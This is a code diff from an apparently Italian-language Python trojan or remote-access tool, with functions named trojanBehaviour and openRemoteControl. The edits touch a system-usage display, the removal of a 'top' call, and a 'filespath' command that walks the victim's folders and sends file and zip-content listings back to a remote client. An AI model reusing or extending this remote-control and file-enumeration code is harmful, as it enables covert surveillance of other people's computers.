@@ -43,7 +43,7 @@ def trojanBehaviour():
             # facciamo un display a video dell'utilizzo
             print("              ------------------------------------------------------------- ")
             print(Fore.RESET + "             |"+Fore.GREEN + " CPU USAGE"+Fore.RESET+" |"+Fore.GREEN + " RAM USAGE"+Fore.RESET+" |"+Fore.GREEN + " DISK USAGE"+Fore.RESET+" |"+Fore.GREEN + " MEMORY USAGE"+Fore.RESET+" |"+Fore.GREEN + " BATTERY"+Fore.RESET+" |")
-            print(Fore.RESET + "             | {:02}%       | {:02}%       | {:02}%        | {:02}%         | {:02}%     |".format(int(cpu),
+            print(Fore.RESET + "             | {:02}%       | {:02}%       | {:02}%        | {:02}%        | {:02}%     |".format(int(cpu),
                                                                                                               int(ram),
                                                                                                               int(disk),
                                                                                                               int(mem),
@@ -55,9 +55,7 @@ def trojanBehaviour():
                                            stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                                            shell=True)
             else:
-                process = subprocess.Popen('top', stdout=subprocess.PIPE,
-                                           stderr=subprocess.PIPE, stdin=subprocess.PIPE,
-                                           shell=True)
+                pass
 
             timer = Timer(3, process.terminate)
             try:
@@ -101,25 +99,7 @@ def filespath(tipologia, client):
         tipologia = listaType[n]
         result.append("\n\nLista dei risultati per estensione: " + tipologia + "\n\n")
 
-        if tipologia == "*":
-            allType=allType+" "+tipologia
-            for cartella, sottocartelle, file in os.walk(path):
-                for item in file:
-                    if item.endswith(".zip"):
-                        result.append('"' + item + '"' + " nel percorso: " + cartella)
-                        pathcurrent = os.getcwd()
-                        os.chdir(cartella)
-                        counter_elemets += 1
-                        zf = zipfile.ZipFile(item, 'r')
-                        os.chdir(pathcurrent)
-                        for item2 in zf.namelist():
-                            result.append('\t-: "' + item2 + '"')
-                        result.append("\n")
-
-                    else:
-                        result.append('"' + item + '"' + " nel percorso: " + cartella + "\n")
-
-        elif tipologia[0:1]==".":
+        if tipologia[0:1]==".":
             allType=allType+" "+tipologia
             for cartella, sottocartelle, file in os.walk(path):
                 for item in file:
@@ -431,7 +411,7 @@ def openRemoteControl(client):
                 client.send((os.getcwd()).encode(FORMAT))
 
             elif comando[0:9] == "filespath":
-                reg = "^filespath .[a-z]{1,4}|^filespath (\*)"
+                reg = "^filespath( \.[a-z]{1,4})+"
                 if(re.match(reg, comando)):
                     try:
                         estensione = comando[10:]
